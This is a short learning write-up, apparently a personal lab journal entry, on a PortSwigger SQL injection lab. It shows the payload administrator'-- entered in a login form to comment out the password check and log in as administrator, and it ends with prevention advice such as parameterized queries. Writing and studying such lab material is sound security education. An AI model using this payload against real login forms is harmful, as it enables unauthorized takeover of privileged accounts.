# 💉 PortSwigger Lab - SQL Injection Login Bypass (administrator'--)

## 🧠 Day 16 Learning

Today I learned how SQL Injection can be used to bypass authentication by manipulating the login query.

Key concepts:

* SQL Injection in login forms
* Comment operator (`--`)
* Authentication bypass
* Unsafe query construction

---

## 🔍 Step 1: Understanding the Login Functionality

The application provides a login form with:

* Username field
* Password field

The backend likely uses a query like:

```sql
SELECT * FROM users 
WHERE username = 'INPUT_USERNAME' 
AND password = 'INPUT_PASSWORD';
```

---

## ⚠️ Vulnerability

User input is directly inserted into the SQL query without sanitization.

This allows attackers to modify the query logic.

---

## ⚔️ Step 2: Exploit Payload

Entered the following in the username field:

```text
administrator'--
```

Password field can be anything:

```text
test123
```

---

## 🧠 How the Injection Works

Original query:

```sql
SELECT * FROM users 
WHERE username='administrator' 
AND password='test123';
```

After injection:

```sql
SELECT * FROM users 
WHERE username='administrator'--' 
AND password='test123';
```

---

## 🔥 Explanation

* `'` → closes the original string
* `--` → comments out the rest of the query
* Password condition is ignored

Final executed query becomes:

```sql
SELECT * FROM users 
WHERE username='administrator';
```

---

## 🚀 Step 3: Result

* Password check is bypassed
* Logged in as **administrator**
* Access to admin account granted

---

## 🏁 Final Result

Successfully exploited:

* SQL Injection vulnerability
* Authentication bypass
* Privileged account access

---

## 🧠 Key Learnings

* Login forms are common SQLi targets
* Comment operators (`--`) can remove security checks
* Even simple injection can lead to full account takeover
* Always test inputs in authentication fields

---

## 🔐 Vulnerability Type

* SQL Injection
* Authentication bypass
* Improper input handling

---

## 🛡️ Prevention

* Use parameterized queries / prepared statements
* Validate and sanitize inputs
* Avoid building queries using string concatenation
* Use proper authentication frameworks

---

## 🔥 Real Insight

> SQL Injection doesn’t break passwords — it breaks the logic behind authentication.

---
